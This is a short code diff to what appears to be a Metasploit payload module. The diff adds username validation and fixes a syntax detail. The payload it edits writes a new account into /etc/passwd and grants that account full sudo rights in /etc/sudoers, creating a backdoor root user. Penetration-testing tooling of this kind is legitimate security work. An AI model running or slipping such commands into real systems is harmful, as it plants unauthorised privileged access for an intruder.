@@ -45,7 +45,7 @@ module MetasploitModule
 
     register_advanced_options(
       [
-        OptEnum.new('RootMethod', [false, 'Set the method that the new user can obtain root', 'SUDO', ['SUID', 'SUDO', 'NONE']]),
+        OptEnum.new('RootMethod', [false, 'Set the method that the new user can obtain root', 'SUDO', ['SUID', 'SUDO', 'NONE']])
       ]
     )
   end
@@ -58,6 +58,11 @@ module MetasploitModule
     return super + command_string
   end
 
+  def user
+    fail_with('User cannot have any of these characters') unless datastore['USER'] =~ /^[a-z][-a-z0-9]*$/
+    datastore['USER']
+  end
+
   #
   # Returns the command string to use for execution
   #
@@ -67,9 +72,9 @@ module MetasploitModule
            else
              rand(1010..1999).to_s
            end
-    payload_cmd = "echo \'#{datastore['USER']}:#{datastore['PASS'].crypt('Az')}:#{suid}:#{suid}::/:/bin/sh\'>>/etc/passwd"
+    payload_cmd = "echo \'#{user}:#{datastore['PASS'].crypt('Az')}:#{suid}:#{suid}::/:/bin/sh\'>>/etc/passwd"
     if datastore['RootMethod'] == 'SUDO'
-      payload_cmd += ";[ -f /etc/sudoers ]&&(echo \'#{datastore['USER']} ALL=(ALL:ALL) ALL\'>>/etc/sudoers)"
+      payload_cmd += ";[ -f /etc/sudoers ]&&(echo \'#{user} ALL=(ALL:ALL) ALL\'>>/etc/sudoers)"
     end
     payload_cmd
   end
